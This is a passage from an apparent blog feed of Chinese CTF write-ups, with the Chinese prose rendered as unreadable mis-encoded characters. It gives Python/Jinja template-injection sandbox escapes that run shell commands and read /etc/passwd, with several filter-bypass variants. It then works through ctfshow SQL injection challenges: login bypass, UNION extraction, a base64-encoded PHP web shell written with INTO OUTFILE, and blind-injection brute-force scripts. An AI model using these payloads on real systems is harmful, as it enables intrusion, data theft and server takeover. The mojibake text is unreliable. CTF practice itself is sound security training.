title="__builtins__å†…å»ºå‡½æ•°:"></a>__builtins__å†…å»ºå‡½æ•°:</h6><p>å†…å»ºå‡½æ•°å°±æ˜¯æœ¬èº«å°±æœ‰çš„ï¼Œå¯åŠ¨çš„æ—¶å€™pythonè§£é‡Šå™¨å°±ä¼šè‡ªåŠ¨è§£æï¼Œå†…å»ºå‡½æ•°é‡Œé¢åŒ…æ‹¬äº†è®¸å¤šä»¬éœ€è¦çš„evalå‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p>ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)`</span><br><span class="line"></span><br><span class="line">`&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)`</span><br><span class="line"></span><br><span class="line">`è¿™ä¸¤ä¸ªpayloadç”¨çš„æ˜¯åŒä¸€ä¸ªæ¨¡å—,__builtins__æ¨¡å—,evalæ–¹æ³•.`</span><br><span class="line"></span><br><span class="line">`[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].popen(&#x27;ls&#x27;).read()`</span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡:"></a>ç»•è¿‡:</h5><h6 id="æ‹¼æ¥ï¼š"><a href="#æ‹¼æ¥ï¼š" class="headerlink" title="æ‹¼æ¥ï¼š"></a>æ‹¼æ¥ï¼š</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)`</span><br><span class="line"></span><br><span class="line">`().__class__.__bases__[0].__subclasses__()[40](&#x27;r&#x27;,&#x27;fla&#x27;+&#x27;g.txt&#x27;)).read()`</span><br></pre></td></tr></table></figure><h6 id="ç¼–ç ï¼š"><a href="#ç¼–ç ï¼š" class="headerlink" title="ç¼–ç ï¼š"></a>ç¼–ç ï¼š</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)`</span><br></pre></td></tr></table></figure><p><code>ç­‰ä»·äº</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode(&#x27;base64&#x27;))(å¯ä»¥çœ‹å‡ºå•åŒå¼•å·å†…çš„éƒ½å¯ä»¥ç¼–ç )`</span><br></pre></td></tr></table></figure><p><code>åŒç†è¿˜å¯ä»¥è¿›è¡Œrot13ã€16è¿›åˆ¶ç¼–ç ç­‰</code></p><h6 id="è¿‡æ»¤ä¸­æ‹¬å·-ï¼š"><a href="#è¿‡æ»¤ä¸­æ‹¬å·-ï¼š" class="headerlink" title="è¿‡æ»¤ä¸­æ‹¬å·[]ï¼š"></a>è¿‡æ»¤ä¸­æ‹¬å·[]ï¼š</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`getitem()`</span><br><span class="line"></span><br><span class="line">`&quot;&quot;.__class__.__mro__[2]`</span><br><span class="line">`&quot;&quot;.__class__.__mro__.__getitem__(2)`</span><br><span class="line"></span><br><span class="line">`pop()`</span><br><span class="line"></span><br><span class="line">`&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()`</span><br></pre></td></tr></table></figure><p><code>å­—å…¸è¯»å–</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`__builtins__[&#x27;eval&#x27;]()`</span><br><span class="line">`__builtins__.eval()`</span><br></pre></td></tr></table></figure><p><code>ç»è¿‡æµ‹è¯•è¿™ç§æ–¹æ³•åœ¨pythonè§£é‡Šå™¨é‡Œä¸èƒ½æ‰§è¡Œï¼Œä½†æ˜¯åœ¨æµ‹è¯•çš„é¢˜ç›®ç¯å¢ƒä¸‹å¯ä»¥æ‰§è¡Œ</code></p><h6 id="è¿‡æ»¤å¼•å·ï¼š"><a href="#è¿‡æ»¤å¼•å·ï¼š" class="headerlink" title="è¿‡æ»¤å¼•å·ï¼š"></a>è¿‡æ»¤å¼•å·ï¼š</h6><p><code>å…ˆè·å–chrå‡½æ•°ï¼Œèµ‹å€¼ç»™chrï¼Œåé¢æ‹¼æ¥å­—ç¬¦ä¸²</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#123;% set`</span><br><span class="line">`chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr`</span><br><span class="line">`%&#125;&#123;&#123;`</span><br><span class="line">`().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()`</span><br><span class="line">`&#125;&#125;`</span><br><span class="line"></span><br><span class="line">`æˆ–è€…å€ŸåŠ©requestå¯¹è±¡ï¼šï¼ˆè¿™ç§æ–¹æ³•åœ¨æ²™ç›’ç§ä¸è¡Œï¼Œåœ¨webä¸‹æ‰è¡Œï¼Œå› ä¸ºéœ€è¦ä¼ å‚ï¼‰`</span><br><span class="line"></span><br><span class="line">`&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd`</span><br><span class="line"></span><br><span class="line">`PSï¼šå°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesåˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚`</span><br><span class="line"></span><br><span class="line">`æ‰§è¡Œå‘½ä»¤ï¼š`</span><br><span class="line"></span><br><span class="line">`&#123;% set`</span><br><span class="line">`chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr`</span><br><span class="line">`%&#125;&#123;&#123;`</span><br><span class="line">`().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read()`</span><br><span class="line">`&#125;&#125;`</span><br><span class="line"></span><br><span class="line">`&#123;&#123;`</span><br><span class="line">`().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read()`</span><br><span class="line">`&#125;&#125;&amp;cmd=id`</span><br></pre></td></tr></table></figure><h6 id="è¿‡æ»¤åŒä¸‹åˆ’çº¿-ï¼š"><a href="#è¿‡æ»¤åŒä¸‹åˆ’çº¿-ï¼š" class="headerlink" title="è¿‡æ»¤åŒä¸‹åˆ’çº¿__ï¼š"></a>è¿‡æ»¤åŒä¸‹åˆ’çº¿__ï¼š</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#123;&#123;`</span><br><span class="line">`&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read()`</span><br><span class="line">`&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__`</span><br></pre></td></tr></table></figure><h6 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤"></a>è¿‡æ»¤</h6>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>show_sqlæ³¨å…¥ä¸Š</title>
      <link href="/2025/03/25/show-sql%E6%B3%A8%E5%85%A5%E4%B8%8A/"/>
      <url>/2025/03/25/show-sql%E6%B3%A8%E5%85%A5%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h3 id="show-sqlæ³¨å…¥ï¼š"><a href="#show-sqlæ³¨å…¥ï¼š" class="headerlink" title="show_sqlæ³¨å…¥ï¼š"></a>show_sqlæ³¨å…¥ï¼š</h3><h4 id="171ï¼š"><a href="#171ï¼š" class="headerlink" title="171ï¼š"></a>171ï¼š</h4><p>è¿™ä¸ªæ˜¯è€ƒå¯Ÿä¸‡èƒ½å¯†ç çš„ç›´æ¥ï¼šâ€™ or 1&#x3D;1â€“+å°±ç›´æ¥å‡ºæ¥äº†</p><p>è¿™é‡Œè¯´ä¸€ä¸‹sqlçš„åŸºæœ¬æŸ¥çœ‹è¯­å¥ï¼šä¸€èˆ¬æ¥è¯´æ­£å¸¸çš„æ˜¯ï¼š</p><p>SELECT * FROM users WHERE username &#x3D; â€˜$inputâ€™ AND password &#x3D; â€˜$passwordâ€™;</p><p>ç„¶åä½ æ³¨å…¥ä¸‡èƒ½å¯†ç å°±æˆä¸ºäº†ï¼š</p><p>SELECT * FROM users WHERE username &#x3D; â€˜â€™ or 1&#x3D;1â€“+ AND password &#x3D; â€˜$passwordâ€™;(â€“+è¡¨ç¤ºæ³¨é‡Šï¼Œå³æ³¨é‡Šä¹‹åçš„éƒ½ä¸æ‰§è¡Œ)</p><p>è¿™æ ·åŸæœ¬çš„æŸ¥è¯¢æ¡ä»¶å°±è¢«ç ´åï¼Œ<code>or 1=1</code> ä½¿å¾—æ•´ä¸ª <code>WHERE</code> æ¡ä»¶æ’ä¸ºçœŸï¼Œå¹¶ä¸” <code>--</code> æ³¨é‡Šæ‰äº†åé¢çš„ <code>AND password = &#39;$password&#39;</code> éƒ¨åˆ†ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´æ”»å‡»è€…ç»•è¿‡è®¤è¯æœºåˆ¶ï¼Œè·å–åˆ°æ•°æ®åº“ä¸­ <code>users</code> è¡¨çš„æ‰€æœ‰è®°å½•ç­‰æ¶æ„æ“ä½œã€‚å½“ç„¶mysqlæ•°æ®åº“ä¹Ÿä¸ä¸€å®šæ˜¯â€™â€™è¿›è¡Œé—­åˆçš„ï¼Œå…·ä½“é—®é¢˜å…·ä½“åˆ†æã€‚</p><h4 id="172"><a href="#172" class="headerlink" title="172:"></a>172:</h4><p>è¿™ä¸ªä¹Ÿæ˜¯æ²¡æœ‰è¿‡æ»¤ï¼Œå…ˆè¯•è¯•ä¸‡èƒ½å¯†ç ï¼šâ€™ or 1&#x3D;1â€“+æˆåŠŸå›æ˜¾è¯´æ˜æ˜¯â€™è¿›è¡Œé—­åˆï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥è¯•è¯•sqlçš„è¯­å¥äº†(æœ‰ä¿©åˆ—æ•°æ®)ï¼š</p><p>â€˜ union select 1,2â€“+</p><p>â€˜ union select 1,database()â€“+</p><p>â€˜ union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;â€™ctfshow_webâ€™â€“+</p><p>â€˜ union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;â€™ctfshow_user2â€™â€“+</p><p>â€˜ union select 1,group_concat(password)from ctfshow_user2â€“+</p><h4 id="173"><a href="#173" class="headerlink" title="173:"></a>173:</h4><p>ä¸€æ ·ï¼Œâ€™ union select 1,2,group_concat(password)from ctfshow_user3â€“+</p><h4 id="174ï¼š"><a href="#174ï¼š" class="headerlink" title="174ï¼š"></a>174ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flag|[0-9]/i</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢å¯ä»¥ä½¿ç”¨replace</p><p>â€˜ union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),â€1â€,â€@Aâ€),â€2â€,â€@Bâ€),â€3â€,â€@Câ€),â€4â€,â€@Dâ€),â€5â€,â€@Eâ€),â€6â€,â€@Fâ€),â€7â€,â€@Gâ€),â€8â€,â€@Hâ€),â€9â€,â€@Iâ€),â€0â€,â€@Jâ€),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),â€1â€,â€@Aâ€),â€2â€,â€@Bâ€),â€3â€,â€@Câ€),â€4â€,â€@Dâ€),â€5â€,â€@Eâ€),â€6â€,â€@Fâ€),â€7â€,â€@Gâ€),â€8â€,â€@Hâ€),â€9â€,â€@Iâ€),â€0â€,â€@Jâ€) from ctfshow_user4 where username&#x3D;â€flagâ€ â€“ +</p><p>ç„¶åå¾—åˆ°ï¼šY@CRmc@Bhvd@CtiNzE@BMjdhOC@JwNTM@ALTQyYzEtOGU@CNC@JzYzliYzU@BOWY@JNzN@I</p><p>ç„¶ååœ¨pycharmé‡Œé¢è¿›è¡Œæ›¿æ¢è§£å¯†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">flag64 = &quot;Y@CRmc@Bhvd@CtiNzE@BMjdhOC@JwNTM@ALTQyYzEtOGU@CNC@JzYzliYzU@BOWY@JNzN@I&quot;</span><br><span class="line"></span><br><span class="line">flag = flag64.replace(&quot;@A&quot;, &quot;1&quot;).replace(&quot;@B&quot;, &quot;2&quot;).replace(&quot;@C&quot;, &quot;3&quot;).replace(&quot;@D&quot;, &quot;4&quot;).replace(&quot;@E&quot;, &quot;5&quot;).replace(</span><br><span class="line">    &quot;@F&quot;, &quot;6&quot;).replace(&quot;@G&quot;, &quot;7&quot;).replace(&quot;@H&quot;, &quot;8&quot;).replace(&quot;@I&quot;, &quot;9&quot;).replace(&quot;@J&quot;, &quot;0&quot;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>å°±å‡ºæ¥flagäº†</p><h4 id="175ï¼š"><a href="#175ï¼š" class="headerlink" title="175ï¼š"></a>175ï¼š</h4><p>è¿™ä¸ªå¯ä»¥è¿›è¡Œå†™å…¥æ–‡ä»¶ï¼š</p><p>union select 1,group_concat(password) from ctfshow_user5 where username&#x3D;â€flagâ€ into outfile â€œ&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txtâ€</p><p>ä½†æ˜¯æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¤ç°ä¸äº†ï¼›</p><p>æˆ–è€…ï¼šä¼ å…¥ä¸€å¥è¯æœ¨é©¬(è¿›è¡Œurlç¼–ç ä¹‹åå†è¿›è¡Œbase64ç¼–ç )</p><p>1â€™ union select 1,from_base64(â€œ%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2bâ€) into outfile â€˜&#x2F;var&#x2F;www&#x2F;html&#x2F;1.phpç„¶åurl&#x2F;1.phpèšå‰‘è¿æ¥å°±è¡Œ</p><h4 id="176ï¼š"><a href="#176ï¼š" class="headerlink" title="176ï¼š"></a>176ï¼š</h4><p>â€˜ or 1&#x3D;1%23ä¸‡èƒ½å¯†ç ç›´æ¥å‡ºæ¥äº†ï¼›</p><h4 id="177ï¼š"><a href="#177ï¼š" class="headerlink" title="177ï¼š"></a>177ï¼š</h4><p>æ­¤å¤„æ˜¯å¯¹ç©ºæ ¼è¿›è¡Œç»•è¿‡</p><p>ç©ºæ ¼å¯ä»¥è¿›è¡Œï¼š&#x2F;**&#x2F;(æ³¨é‡Š)ï¼Œ%0a(æ¢è¡Œç¬¦),%0b(å‚ç›´åˆ¶è¡¨ç¬¦å·®ä¸å¤šä¹Ÿæ˜¯æ¢è¡Œç¬¦),%0c.%09</p><h4 id="178"><a href="#178" class="headerlink" title="178:"></a>178:</h4><p>åŒä¸Šï¼Œç©ºæ ¼æ¢æˆ%0b|%0c</p><h4 id="179"><a href="#179" class="headerlink" title="179:"></a>179:</h4><p>ç©ºæ ¼æ¢æˆ%0c</p><h4 id="180"><a href="#180" class="headerlink" title="180:"></a>180:</h4><p>â€˜orâ€™1â€™&#x3D;â€™1â€™â€“%0c</p><h4 id="181ï¼š"><a href="#181ï¼š" class="headerlink" title="181ï¼š"></a>181ï¼š</h4><p>â€˜orâ€™1â€™&#x3D;â€™1â€™â€“%0c</p><h4 id="182ï¼š"><a href="#182ï¼š" class="headerlink" title="182ï¼š"></a>182ï¼š</h4><p>â€˜orâ€™1&#x3D;1â€™â€“%01</p><p>â€˜orâ€™1&#x3D;1â€™â€“%08</p><p>0cä¹Ÿå¯ä»¥</p><h4 id="183ï¼š"><a href="#183ï¼š" class="headerlink" title="183ï¼š"></a>183ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åœ¨csdnä¸Šé¢å­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`like(&#x27;&#123;&#125;%&#x27;)&quot;</span>.<span class="built_in">format</span>(flag + k)&#125;</span><br></pre></td></tr></table></figure><ul><li>è¿™è¡Œä»£ç æ„é€ äº†ä¸€ä¸ªå­—å…¸ <code>data</code>ï¼Œç”¨äºä½œä¸º POST è¯·æ±‚çš„æ•°æ®ã€‚</li><li><code>tableName</code> æ˜¯è¯·æ±‚å‚æ•°åï¼Œå…¶å€¼æ˜¯ä¸€ä¸ª SQL è¯­å¥ç‰‡æ®µã€‚<code>like(&#39;&#123;&#125;%&#39;)</code> æ˜¯ SQL çš„æ¨¡ç³ŠåŒ¹é…æ“ä½œç¬¦ï¼Œæ„æ€æ˜¯åŒ¹é…ä»¥ <code>flag + k</code> å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚æ³¨é‡Šæ‰çš„éƒ¨åˆ†ä½¿ç”¨äº† <code>regexp</code> æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ŒåŠŸèƒ½ç±»ä¼¼ã€‚</li></ul><p>ç„¶åç©ºæ ¼çš„è¯å¯ä»¥ä½¿ç”¨()ç»•è¿‡æˆ–è€…&#96;&#96;åå¼•å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &#x27;http://cd86bba0-571c-482d-a491-5e7e79faadd1.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="line">dic = string.digits+string.ascii_lowercase+&#x27;-&#123;&#125;&#x27;  # flagå¯èƒ½çš„å­—ç¬¦</span><br><span class="line"># print(dic)</span><br><span class="line">out = &#x27;ctfshow&#123;&#x27;  # å·²ç»ç¡®å®šçš„éƒ¨åˆ†</span><br><span class="line">for j in range(0, 50):  # ä¸ºäº†ç¡®ä¿flagå®Œæ•´è¾“å‡ºï¼ŒèŒƒå›´å°½é‡å¤§ä¸€ç‚¹ï¼Œè§‚å¯Ÿåˆ°flagå®Œå…¨è¾“å‡ºåç»“æŸè¿è¡Œå³å¯</span><br><span class="line">    for k in dic:</span><br><span class="line">        payload = &#123;&#x27;tableName&#x27;: f&quot;(ctfshow_user)where(pass)like&#x27;&#123;out+k&#125;%&#x27;&quot;&#125;  # å°†æ¯æ¬¡æ›´æ–°åçš„outåŠ ä¸Šæˆ‘ä»¬æ–°å¢çš„ä¸€ä¸ªçŒœæµ‹å­—ç¬¦æ·»åŠ åˆ°payload</span><br><span class="line">        # print(payload)</span><br><span class="line">        re = requests.post(url, data=payload)</span><br><span class="line">        # print(re.text)</span><br><span class="line">        if &#x27;$user_count = 1;&#x27; in re.text:</span><br><span class="line">            print(k)</span><br><span class="line">            out += k</span><br><span class="line">            break  # å›æ˜¾1è¯´æ˜æˆ‘ä»¬çŒœæ­£ç¡®äº†ï¼Œè·³å‡ºå†…å±‚å¾ªç¯ï¼Œç»§ç»­çŒœä¸‹ä¸€ä½</span><br><span class="line">    print(out)</span><br></pre></td></tr></table></figure><h4 id="184ï¼š"><a href="#184ï¼š" class="headerlink" title="184ï¼š"></a>184ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æ–°è¿‡æ»¤äº†whereäº†ï¼Œå¯ä»¥ä½¿ç”¨having</p><p>åŒºåˆ«ï¼š<code>WHERE</code>æ˜¯å¯¹åŸå§‹æ•°æ®è¡Œçš„è¿‡æ»¤ï¼Œ<code>HAVING</code>æ˜¯å¯¹åˆ†ç»„èšåˆåçš„ç»“æœè¿›è¡Œç­›é€‰ã€‚åœ¨æ²¡æœ‰<code>GROUP BY</code>å­å¥æ—¶ï¼Œ<code>HAVING</code>çš„è¡Œä¸ºä¸<code>WHERE</code>ç±»ä¼¼ï¼Œä½†<code>HAVING</code>æ”¯æŒèšåˆå‡½æ•°</p><p>ä¸€ä¸ªHAVINGå­å¥å¿…é¡»ä½äºGROUP BYå­å¥ä¹‹åï¼Œå¹¶ä½äºORDER BYå­å¥ä¹‹å‰</p><p>ç„¶åå•åŒå¼•å·ã€åå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰è¿‡æ»¤ç©ºæ ¼,å•åŒå¼•å·å¯ä»¥ç”¨æ‹¬å·+åå…­è¿›åˆ¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &#x27;http://6244362c-ee43-4012-81d5-275793a9617c.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="line">dic = string.digits+string.ascii_lowercase+&#x27;-&#123;&#125;&#x27;  # flagå¯èƒ½çš„å­—ç¬¦</span><br><span class="line">dic = [f&quot;&#123;ord(c):02x&#125;&quot; for c in dic]</span><br><span class="line"># print(dic)</span><br><span class="line">out = &#x27;0x63746673686f777b&#x27;  # å·²ç»ç¡®å®šçš„éƒ¨åˆ†</span><br><span class="line">for j in range(0, 50):  # ä¸ºäº†ç¡®ä¿flagå®Œæ•´è¾“å‡ºï¼ŒèŒƒå›´å°½é‡å¤§ä¸€ç‚¹ï¼Œè§‚å¯Ÿåˆ°flagå®Œå…¨è¾“å‡ºåç»“æŸè¿è¡Œå³å¯</span><br><span class="line">    for k in dic:</span><br><span class="line">        payload = &#123;&#x27;tableName&#x27;: f&quot;ctfshow_user group by pass having pass like &#123;out+k&#125;25&quot;&#125;  # å°†æ¯æ¬¡æ›´æ–°åçš„outåŠ ä¸Šæˆ‘ä»¬æ–°å¢çš„ä¸€ä¸ªçŒœæµ‹å­—ç¬¦æ·»åŠ åˆ°payload</span><br><span class="line">        # print(payload)</span><br><span class="line">        re = requests.post(url, data=payload)</span><br><span class="line">        # print(re.text)</span><br><span class="line">        if &#x27;$user_count = 1;&#x27; in re.text:</span><br><span class="line">            print(k)</span><br><span class="line">            out += k</span><br><span class="line">            break  # å›æ˜¾1è¯´æ˜æˆ‘ä»¬çŒœæ­£ç¡®äº†ï¼Œè·³å‡ºå†…å±‚å¾ªç¯ï¼Œç»§ç»­çŒœä¸‹ä¸€ä½</span><br><span class="line">    print(out)</span><br></pre></td></tr></table></figure><h4 id="185ï¼š"><a href="#185ï¼š" class="headerlink" title="185ï¼š"></a>185ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¿‡æ»¤äº†æ•°å­—ä¸è¿‡ï¼Œå¯ä»¥ä½¿ç”¨sqlè¯­æ³•ï¼šå¯ä»¥ä½¿ç”¨ true ç»“åˆ concat æ‹¼æ¥å‡ºæ•°å­—   ä¾‹ï¼š</p><p>mysql&gt; select concat(true,true);<br>+â€”â€”â€”â€”â€”â€”-+<br>| concat(true,true) |<br>+â€”â€”â€”â€”â€”â€”-+<br>| 11                |<br>+â€”â€”â€”â€”â€”â€”-+<br>1 row in set (0.00 sec)</p><p>é™„ä¸Šyuå¸ˆå‚…çš„è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#author:yu22x</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=&quot;http://8319afbf-281c-4a73-b14e-a29426d0e556.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line">s=&#x27;0123456789abcdef-&#123;&#125;&#x27;</span><br><span class="line">def convert(strs):</span><br><span class="line">  t=&#x27;concat(&#x27;</span><br><span class="line">  for s in strs:</span><br><span class="line">    t+= &#x27;char(true&#x27;+&#x27;+true&#x27;*(ord(s)-1)+&#x27;),&#x27;</span><br><span class="line">  return t[:-1]+&quot;)&quot;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,45):</span><br><span class="line">  print(i)</span><br><span class="line">  for j in s:</span><br><span class="line">    d = convert(f&#x27;^ctfshow&#123;flag+j&#125;&#x27;)</span><br><span class="line">    data=&#123;</span><br><span class="line">    &#x27;tableName&#x27;:f&#x27; ctfshow_user group by pass having pass regexp(&#123;d&#125;)&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    #print(data)</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    #print(r.text)</span><br><span class="line">    if(&quot;user_count = 1&quot;  in r.text):</span><br><span class="line">      flag+=j</span><br><span class="line">      print(flag)</span><br><span class="line">      if j==&#x27;&#125;&#x27;:</span><br><span class="line">        exit(0)</span><br><span class="line">      break</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def convert(strs):</span><br><span class="line">  t=&#x27;concat(&#x27;</span><br><span class="line">  for s in strs:</span><br><span class="line">    t+= &#x27;char(true&#x27;+&#x27;+true&#x27;*(ord(s)-1)+&#x27;),&#x27;</span><br><span class="line">  return t[:-1]+&quot;)&quot;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå…ˆå°†sç»™è½¬åŒ–ä¸ºascllç ï¼Œç„¶åè¿›è¡Œtrueçš„åŠ å’Œä¹˜ï¼Œç”¨æ¥å›æ˜¾å‡ºæ¥å­—æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(1,45):</span><br><span class="line">  print(i)</span><br><span class="line">  for j in s:</span><br><span class="line">    d = convert(f&#x27;^ctfshow&#123;flag+j&#125;&#x27;)</span><br><span class="line">    data=&#123;</span><br><span class="line">    &#x27;tableName&#x27;:f&#x27; ctfshow_user group by pass having pass regexp(&#123;d&#125;)&#x27;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå…ˆæ‰¾å‡ºæ¥ä»¥ctfshow{å¼€å¤´çš„å­—æ®µï¼Œç„¶åçŒœflag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(&quot;user_count = 1&quot;  in r.text):</span><br><span class="line">  flag+=j</span><br><span class="line">  print(flag)</span><br><span class="line">  if j==&#x27;&#125;&#x27;:</span><br><span class="line">    exit(0)</span><br><span class="line">  break</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç”¨æ¥åˆ¤æ–­flagã€‚</p><h4 id="186ï¼š"><a href="#186ï¼š" class="headerlink" title="186ï¼š"></a>186ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯yuå¸ˆå‚…çš„è„šæœ¬</p><h4 id="187ï¼š"><a href="#187ï¼š" class="headerlink" title="187ï¼š"></a>187ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">  $sql = &quot;select count(*) from ctfshow_user where username = &#x27;$username&#x27; and password= &#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure><figure 